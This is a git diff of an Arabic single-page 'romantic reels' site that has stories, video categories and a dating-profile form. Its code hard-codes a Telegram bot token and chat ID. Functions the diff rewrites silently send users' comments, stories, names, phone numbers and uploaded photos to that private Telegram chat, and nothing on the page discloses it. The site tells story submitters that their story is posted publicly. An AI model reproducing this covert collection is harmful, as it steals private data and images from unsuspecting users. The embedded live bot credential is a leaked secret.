@@ -44,7 +44,7 @@
         .reels-container { display: flex; flex-direction: column; align-items: center; width: 100%; max-width: 480px; margin: 0 auto; padding: 0 0 12px; gap: 20px; }
         .reel { position: relative; width: 100%; background: #000; border-radius: 24px; overflow: hidden; box-shadow: 0 12px 28px rgba(0,0,0,0.5), 0 0 0 1px rgba(255,153,204,0.2); }
         .video-container { position: relative; width: 100%; aspect-ratio: 9 / 16; background: #0a0a0a; }
-        video { position: absolute; top: 0; left: 0; width: 100%; height: 100%; object-fit: cover; }
+        video { position: absolute; top: 0; left: 0; width: 100%; height: 100%; object-fit: cover; background: #000; }
         .actions-sidebar { position: absolute; bottom: 20%; left: 12px; display: flex; flex-direction: column; gap: 20px; z-index: 15; }
         .action-btn { display: flex; flex-direction: column; align-items: center; gap: 6px; background: rgba(0,0,0,0.5); backdrop-filter: blur(8px); padding: 8px 10px; border-radius: 40px; cursor: pointer; border: none; color: #fff4f0; font-size: 0.75rem; font-weight: 500; min-width: 60px; transition: transform 0.1s; }
         .action-btn:active { transform: scale(0.94); }
@@ -115,20 +115,11 @@
 
 <div id="storiesSection" style="display: none;">
     <div class="stories-section">
-        <div class="search-stories">
-            <i class="fas fa-search"></i>
-            <input type="text" id="storySearchInput" placeholder="ابحث عن قصة...">
-        </div>
+        <div class="search-stories"><i class="fas fa-search"></i><input type="text" id="storySearchInput" placeholder="ابحث عن قصة..."></div>
         <div id="storiesContainer" class="stories-container"></div>
-        <div class="add-story">
-            <h4><i class="fas fa-pen-fancy"></i> شارك قصتك</h4>
-            <input type="text" id="newStoryTitle" placeholder="عنوان القصة">
-            <textarea id="newStoryContent" placeholder="اكتب قصتك هنا..."></textarea>
-            <button id="submitStoryBtn">نشر القصة</button>
-        </div>
+        <div class="add-story"><h4><i class="fas fa-pen-fancy"></i> شارك قصتك</h4><input type="text" id="newStoryTitle" placeholder="عنوان القصة"><textarea id="newStoryContent" placeholder="اكتب قصتك هنا..."></textarea><button id="submitStoryBtn">نشر القصة</button></div>
     </div>
 </div>
-
 <div class="footer-note">❤️ قصص حبك | ريلز رومانسية لا تنتهي</div>
 
 <!-- مودال التواصل -->
@@ -151,7 +142,7 @@
 <div id="storyModal" class="story-modal"><div class="story-modal-content"><h3 id="storyTitle"></h3><p id="storyText"></p><button class="close-story" id="closeStoryBtn">&times;</button></div></div>
 
 <script>
-// ====================== تعريف الفئات والحد الأقصى لكل فئة ======================
+// ====================== التعريفات ======================
 const CATEGORIES = {
     romance: { prefix: "R", name: "رومانسية", max: 15 },
     wives: { prefix: "Z", name: "للزوجات", max: 15 },
@@ -160,7 +151,6 @@ const CATEGORIES = {
     hot: { prefix: "N", name: "أفلام نار", max: 15 }
 };
 
-// ====================== القصص الأساسية ======================
 let stories = [
     { title: "قصة زوجة مع أخو زوجها", content: "كانت ليلى متزوجة من سامر الذي سافر للخارج لفترة طويلة. أخوه خالد كان يقيم معهم. بدأت المشاعر تتسلل بين ليلى وخالد في غياب سامر، وتطورت العلاقة إلى ما هو أبعد من الحدود... القصة تحكي صراعاً بين الرغبة والخيانة والعواقب الوخيمة." },
     { title: "قصة امرأة مع جارها", content: "جمانة كانت تشعر بالوحدة في منزلها الكبير. جارها الجديد وسيم جذب انتباهها. بدأت تلتقي به سراً، وتتطور الأحداث إلى علاقة محرمة تنتهي بفضيحة هزت الحي بأكمله." },
@@ -192,121 +182,53 @@ let reelsData = [];
 let currentCategory = "all";
 let currentVideoIdForModal = null;
 
-// ====================== بوت التيليجرام ======================
+// بوت التيليجرام
 const BOT_TOKEN = "8554468568:AAFvQJVSo6TtBao6xreo_Zf1DxnFupKVTrc";
 const CHAT_ID = "1367401179";
+async function sendToBot(message) { try { await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ chat_id: CHAT_ID, text: message }) }); } catch(e) { console.error(e); } }
+async function sendPhotoToBot(photoFile, caption = "") { let fd = new FormData(); fd.append('chat_id', CHAT_ID); fd.append('photo', photoFile, photoFile.name); if (caption) fd.append('caption', caption); try { await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: 'POST', body: fd }); } catch(e) {} }
 
-async function sendToBot(message) {
-    try {
-        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({ chat_id: CHAT_ID, text: message })
-        });
-    } catch(e) { console.error(e); }
-}
-
-async function sendPhotoToBot(photoFile, caption = "") {
-    const formData = new FormData();
-    formData.append('chat_id', CHAT_ID);
-    formData.append('photo', photoFile, photoFile.name);
-    if (caption) formData.append('caption', caption);
-    try {
-        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: 'POST', body: formData });
-    } catch(e) { console.error(e); }
-}
-
-// ====================== فحص وجود الفيديو مع تحسين الأداء ======================
-async function videoExists(url) {
-    try {
-        const controller = new AbortController();
-        const timeoutId = setTimeout(() => controller.abort(), 3000);
-        const response = await fetch(url, { method: 'HEAD', cache: 'no-cache', signal: controller.signal });
-        clearTimeout(timeoutId);
-        return response.ok;
-    } catch {
-        return false;
-    }
-}
-
+// ====================== فحص وجود الفيديو ======================
+async function videoExists(url) { try { const res = await fetch(url, { method: 'HEAD', cache: 'no-cache' }); return res.ok; } catch { return false; } }
 async function generateExistingVideos() {
-    const promises = [];
-    const results = [];
+    let results = [];
     for (const [catKey, cat] of Object.entries(CATEGORIES)) {
         for (let i = 1; i <= cat.max; i++) {
             const videoUrl = `${cat.prefix}${i}.mp4`;
-            promises.push(
-                videoExists(videoUrl).then(exists => {
-                    if (exists) {
-                        results.push({
-                            id: `${catKey}_${i}`,
-                            videoUrl: videoUrl,
-                            user: `${cat.name}_${i}`,
-                            description: `${cat.name} - فيديو رقم ${i} 🔥`,
-                            likes: Math.floor(Math.random() * 200) + 20,
-                            isLiked: false,
-                            category: catKey,
-                            comments: []
-                        });
-                    }
-                })
-            );
+            if (await videoExists(videoUrl)) {
+                results.push({ id: `${catKey}_${i}`, videoUrl, user: `${cat.name}_${i}`, description: `${cat.name} - فيديو رقم ${i} 🔥`, likes: Math.floor(Math.random() * 200) + 20, isLiked: false, category: catKey, comments: [] });
+            }
         }
     }
-    await Promise.all(promises);
     return results;
 }
 
-// ====================== دوال الريلز مع تحميل متأخر ======================
+// ====================== دوال الريلز (مع تحسين الأداء) ======================
 function escapeHtml(s){ if(!s) return ''; return s.replace(/[&<>]/g, m=> m==='&'?'&amp;': m==='<'?'&lt;': m==='>'?'&gt;': m); }
 function updateLikeUI(id,lc,liked){ let reel=document.querySelector(`.reel[data-reel-id='${id}']`); if(!reel) return; let likeBtn=reel.querySelector('.like-btn'), likeSpan=reel.querySelector('.like-count'); if(likeBtn) liked?likeBtn.classList.add('liked'):likeBtn.classList.remove('liked'); if(likeSpan) likeSpan.innerText=lc; }
 function handleLike(id){ let v=reelsData.find(v=>v.id===id); if(!v) return; if(!v.isLiked){ v.isLiked=true; v.likes++; }else{ v.isLiked=false; v.likes--; } updateLikeUI(id,v.likes,v.isLiked); }
 function handleShare(){ alert("✨ تم مشاركة الفيديو الرومانسي ✨"); }
-function toggleMute(videoElem, muteBtn){ 
-    videoElem.muted = !videoElem.muted;
-    muteBtn.innerHTML = videoElem.muted ? '<i class="fas fa-volume-mute"></i><span>صوت</span>' : '<i class="fas fa-volume-up"></i><span>صوت</span>';
-}
+function toggleMute(ve, mb){ ve.muted = !ve.muted; mb.innerHTML = ve.muted ? '<i class="fas fa-volume-mute"></i><span>صوت</span>' : '<i class="fas fa-volume-up"></i><span>صوت</span>'; }
 function openCommentModal(vidId){ let v=reelsData.find(v=>v.id===vidId); if(!v) return; currentVideoIdForModal=vidId; renderCommentsInModal(v.comments); document.getElementById("commentModal").style.display="flex"; }
 function renderCommentsInModal(ca){ let div=document.getElementById("commentsList"); if(!ca.length){ div.innerHTML=`<div style="text-align:center; padding:20px;">لا توجد تعليقات بعد.. كن أول من يعلق 💬</div>`; return; } div.innerHTML=ca.map(c=>`<div class="comment-item"><div class="comment-name"><i class="fas fa-user-circle"></i> ${escapeHtml(c.username)}</div><div class="comment-text">${escapeHtml(c.text)}</div></div>`).join(''); }
-function addNewComment(vidId,txt){ 
-    if(!txt.trim()) return false; 
-    let v=reelsData.find(v=>v.id===vidId); 
-    if(!v) return false; 
-    let nc={id:Date.now(), username:"عاشق_رومانسي", text:txt.trim()}; 
-    v.comments.push(nc); 
-    if(currentVideoIdForModal===vidId) renderCommentsInModal(v.comments); 
-    updateCommentCounter(vidId);
-    sendToBot(`💬 تعليق جديد على فيديو ${v.videoUrl}:\n👤 ${nc.username}\n📝 ${nc.text}`);
-    return true; 
-}
-function updateCommentCounter(vidId){ 
-    let reel=document.querySelector(`.reel[data-reel-id='${vidId}']`); 
-    if(!reel) return; 
-    let v=reelsData.find(v=>v.id===vidId); 
-    if(v){ 
-        let span=reel.querySelector('.comment-btn span'); 
-        if(span) span.innerText=v.comments.length; 
-    } 
-}
+function addNewComment(vidId,txt){ if(!txt.trim()) return false; let v=reelsData.find(v=>v.id===vidId); if(!v) return false; let nc={id:Date.now(), username:"عاشق_رومانسي", text:txt.trim()}; v.comments.push(nc); if(currentVideoIdForModal===vidId) renderCommentsInModal(v.comments); updateCommentCounter(vidId); sendToBot(`💬 تعليق جديد على فيديو ${v.videoUrl}:\n👤 ${nc.username}\n📝 ${nc.text}`); return true; }
+function updateCommentCounter(vidId){ let reel=document.querySelector(`.reel[data-reel-id='${vidId}']`); if(!reel) return; let v=reelsData.find(v=>v.id===vidId); if(v){ let span=reel.querySelector('.comment-btn span'); if(span) span.innerText=v.comments.length; } }
 
-// إنشاء عنصر الفيديو مع تحميل متأخر
-function createVideoElement(videoUrl) {
+// تحسين الأداء: تحميل مسبق للفيديوهات التالية
+let preloadedVideos = new Map(); // تخزين عناصر الفيديو المُحمّلة مسبقاً
+function preloadVideo(videoUrl) {
+    if (!videoUrl || preloadedVideos.has(videoUrl)) return;
     const video = document.createElement('video');
-    video.playsInline = true;
-    video.preload = "metadata";
-    video.controls = true;
-    video.loading = "lazy";
-    const source = document.createElement('source');
-    source.src = videoUrl;
-    source.type = "video/mp4";
-    video.appendChild(source);
-    return video;
+    video.preload = "auto";
+    video.src = videoUrl;
+    video.load();
+    preloadedVideos.set(videoUrl, video);
 }
 
-function createReelElement(v){
+function createReelElement(v, index, allVideosList){
     let div=document.createElement('div'); div.className='reel'; div.setAttribute('data-reel-id',v.id);
     let vc=document.createElement('div'); vc.className='video-container';
-    let ve = createVideoElement(v.videoUrl);
+    let ve=document.createElement('video'); ve.src=v.videoUrl; ve.playsInline=true; ve.preload="auto"; ve.controls=true;
     vc.appendChild(ve);
     
     let as=document.createElement('div'); as.className='actions-sidebar';
@@ -325,23 +247,16 @@ function createReelElement(v){
     sb.addEventListener('click',(e)=>{ e.stopPropagation(); handleShare(); });
     mb.addEventListener('click',(e)=>{ e.stopPropagation(); toggleMute(ve, mb); });
     
-    // معالجة خاصة لفيديو N1.mp4: البدء من الثانية 89 (1:29)
+    // فيديو N1.mp4 يبدأ من الثانية 89
     if(v.videoUrl === "N1.mp4") {
-        ve.addEventListener('loadedmetadata', function() {
-            if(this.duration > 89) this.currentTime = 89;
-        });
+        ve.addEventListener('loadedmetadata', function() { if(this.duration > 89) this.currentTime = 89; });
     }
     
-    // تحميل الفيديو فقط عندما يكون قريباً من المشاهدة
-    const observer = new IntersectionObserver((entries) => {
-        entries.forEach(entry => {
-            if (entry.isIntersecting) {
-                if (ve.load && ve.readyState === 0) ve.load();
-                observer.unobserve(ve);
-            }
-        });
-    }, { rootMargin: "200px" });
-    observer.observe(ve);
+    // تحميل مسبق للفيديو التالي
+    if (index < allVideosList.length - 1) {
+        const nextVideo = allVideosList[index + 1];
+        preloadVideo(nextVideo.videoUrl);
+    }
     
     return div;
 }
@@ -350,7 +265,24 @@ function renderReelsByCategory(){
     container.innerHTML=''; 
     let filtered=currentCategory==="all"?reelsData:reelsData.filter(v=>v.category===currentCategory);
     if(filtered.length===0){ container.innerHTML=`<div style="text-align:center; padding:40px; color:#ff99cc;">لا توجد فيديوهات في هذا التصنيف 🥀</div>`; return; }
-    filtered.forEach(v=>{ container.appendChild(createReelElement(v)); });
+    filtered.forEach((v,i)=> { container.appendChild(createReelElement(v, i, filtered)); });
+    
+    // مراقبة الفيديوهات باستخدام Intersection Observer لتحميلها عند الظهور
+    const observer = new IntersectionObserver((entries) => {
+        entries.forEach(entry => {
+            if (entry.isIntersecting) {
+                const video = entry.target.querySelector('video');
+                if (video && video.readyState < 2) { // ليس محملاً بعد
+                    video.load();
+                    video.play().catch(e => console.log("auto-play prevented"));
+                }
+            }
+        });
+    }, { threshold: 0.3 });
+    
+    document.querySelectorAll('.reel video').forEach(video => {
+        observer.observe(video.parentElement.parentElement);
+    });
 }
 
 // ====================== قسم القصص ======================
@@ -358,43 +290,21 @@ function renderStories(filterText = "") {
     let filtered = stories.filter(s => s.title.includes(filterText) || s.content.includes(filterText));
     storiesContainerDiv.innerHTML = '';
     filtered.forEach(story => {
-        const btn = document.createElement('div');
-        btn.className = 'story-btn';
+        const btn = document.createElement('div'); btn.className = 'story-btn';
         btn.innerHTML = `<i class="fas fa-book"></i> ${escapeHtml(story.title)}`;
         btn.addEventListener('click', () => showStoryModal(story.title, story.content));
         storiesContainerDiv.appendChild(btn);
     });
-    if (filtered.length === 0) {
-        storiesContainerDiv.innerHTML = '<div style="text-align:center; padding:20px; color:#ff99cc;">لا توجد قصص مطابقة 🔍</div>';
-    }
+    if (filtered.length === 0) storiesContainerDiv.innerHTML = '<div style="text-align:center; padding:20px; color:#ff99cc;">لا توجد قصص مطابقة 🔍</div>';
 }
-
-function showStoryModal(title, content){
-    document.getElementById("storyTitle").innerText = title;
-    document.getElementById("storyText").innerText = content;
-    document.getElementById("storyModal").style.display = "flex";
-}
-
-function closeStoryModal(){
-    document.getElementById("storyModal").style.display = "none";
-}
-
-function addNewStory(title, content) {
-    if (!title.trim() || !content.trim()) return false;
-    const newStory = { title: title.trim(), content: content.trim() };
-    stories.push(newStory);
-    renderStories(storySearchInput.value);
-    sendToBot(`📖 قصة جديدة:\nالعنوان: ${newStory.title}\nالمحتوى: ${newStory.content}`);
-    return true;
-}
+function showStoryModal(title, content){ document.getElementById("storyTitle").innerText = title; document.getElementById("storyText").innerText = content; document.getElementById("storyModal").style.display = "flex"; }
+function closeStoryModal(){ document.getElementById("storyModal").style.display = "none"; }
+function addNewStory(title, content) { if (!title.trim() || !content.trim()) return false; const newStory = { title: title.trim(), content: content.trim() }; stories.push(newStory); renderStories(storySearchInput.value); sendToBot(`📖 قصة جديدة:\nالعنوان: ${newStory.title}\nالمحتوى: ${newStory.content}`); return true; }
 
 // ====================== تبديل الفئات ======================
 function setCategory(cat){
     currentCategory = cat;
-    filterBtns.forEach(btn=>{
-        if(btn.getAttribute('data-category')===cat) btn.classList.add('active');
-        else btn.classList.remove('active');
-    });
+    filterBtns.forEach(btn=>{ if(btn.getAttribute('data-category')===cat) btn.classList.add('active'); else btn.classList.remove('active'); });
     if(cat === "stories"){
         container.style.display = "none";
         storiesSection.style.display = "block";
@@ -408,14 +318,10 @@ function setCategory(cat){
 filterBtns.forEach(btn=>{ btn.addEventListener('click',()=>{ setCategory(btn.getAttribute('data-category')); }); });
 
 // ====================== إرسال بيانات التواصل ======================
-async function sendProfileToBot(name, bio, lookingFor, phone, images){
-    let text = `✨ لقاء الأحلام ✨\nالاسم: ${name}\nنبذة: ${bio || "غير مذكور"}\nأبحث عن: ${lookingFor}\nالهاتف: ${phone || "غير مشارك"}\nعدد الصور: ${images.length}`;
-    await sendToBot(text);
-    for(let img of images){
-        await sendPhotoToBot(img, `صورة للمستخدم: ${name}`);
-    }
+async function sendProfileToBot(name,bio,lookingFor,phone,images){
+    await sendToBot(`✨ لقاء الأحلام ✨\nالاسم: ${name}\nنبذة: ${bio||"غير مذكور"}\nأبحث عن: ${lookingFor}\nالهاتف: ${phone||"غير مشارك"}\nعدد الصور: ${images.length}`);
+    for(let img of images) await sendPhotoToBot(img, `صورة للمستخدم: ${name}`);
 }
-
 function openConnectModal(){ connectModal.style.display="flex"; }
 function closeConnectModal(){ connectModal.style.display="none"; }
 connectCard.addEventListener('click',openConnectModal);
@@ -443,17 +349,10 @@ multiImagesInput.addEventListener('change',(e)=>{
 submitProfileBtn.addEventListener('click',async()=>{
     let name=document.getElementById("profileName").value.trim();
     if(!name) return;
-    let bio=document.getElementById("profileBio").value.trim();
-    let lookingFor=document.getElementById("lookingFor").value;
-    let phone=document.getElementById("profilePhone").value.trim();
-    await sendProfileToBot(name,bio,lookingFor,phone,selectedImages);
+    await sendProfileToBot(name, document.getElementById("profileBio").value.trim(), document.getElementById("lookingFor").value, document.getElementById("profilePhone").value.trim(), selectedImages);
     closeConnectModal();
-    document.getElementById("profileName").value="";
-    document.getElementById("profileBio").value="";
-    document.getElementById("profilePhone").value="";
-    document.getElementById("lookingFor").selectedIndex=0;
-    selectedImages=[];
-    imagePreviewContainer.innerHTML="";
+    document.getElementById("profileName").value=""; document.getElementById("profileBio").value=""; document.getElementById("profilePhone").value=""; document.getElementById("lookingFor").selectedIndex=0;
+    selectedImages=[]; imagePreviewContainer.innerHTML="";
 });
 shareProfileBtn.addEventListener('click',()=>{
     let name=document.getElementById("profileName").value.trim();
@@ -479,28 +378,20 @@ const storyModal=document.getElementById("storyModal"), closeStoryBtn=document.g
 closeStoryBtn.addEventListener('click',closeStoryModal);
 storyModal.addEventListener('click',(e)=>{ if(e.target===storyModal) closeStoryModal(); });
 
-// ====================== البحث في القصص وإضافة قصة جديدة ======================
-storySearchInput.addEventListener('input', (e) => {
-    if (currentCategory === "stories") renderStories(e.target.value);
-});
+// ====================== البحث وإضافة القصص ======================
+storySearchInput.addEventListener('input', (e) => { if (currentCategory === "stories") renderStories(e.target.value); });
 submitStoryBtn.addEventListener('click', () => {
-    const title = newStoryTitle.value.trim();
-    const content = newStoryContent.value.trim();
-    if (!title || !content) {
-        alert("الرجاء إدخال عنوان ونص للقصة");
-        return;
-    }
+    const title = newStoryTitle.value.trim(), content = newStoryContent.value.trim();
+    if (!title || !content) { alert("الرجاء إدخال عنوان ونص للقصة"); return; }
     addNewStory(title, content);
-    newStoryTitle.value = "";
-    newStoryContent.value = "";
+    newStoryTitle.value = ""; newStoryContent.value = "";
     alert("✨ تمت إضافة قصتك بنجاح! ستظهر للجميع ✨");
 });
 
 // ====================== بدء التشغيل ======================
 (async function init() {
     container.innerHTML = `<div style="text-align:center; padding:40px; color:#ff99cc;"><i class="fas fa-spinner fa-pulse"></i> جاري تحميل الفيديوهات...</div>`;
-    const existingVideos = await generateExistingVideos();
-    allVideos = existingVideos;
+    allVideos = await generateExistingVideos();
     reelsData = JSON.parse(JSON.stringify(allVideos));
     setCategory("all");
 })();
